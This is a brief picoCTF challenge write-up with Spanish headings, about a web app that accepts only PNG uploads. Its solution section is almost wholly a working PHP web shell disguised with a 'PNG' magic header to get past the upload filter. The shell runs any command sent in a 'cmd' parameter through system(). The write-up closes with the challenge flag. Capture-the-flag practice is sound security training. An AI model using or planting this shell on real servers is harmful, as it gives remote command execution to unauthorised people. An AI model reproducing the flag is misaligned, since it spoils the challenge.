## Descripción 
I found a web app that can help process images: PNG images only!

Additional details will be available after launching your challenge instance.
## Hints

## Solución
```
PNG
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>

picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_ab0ece03}

```
## Notas

## Referencias
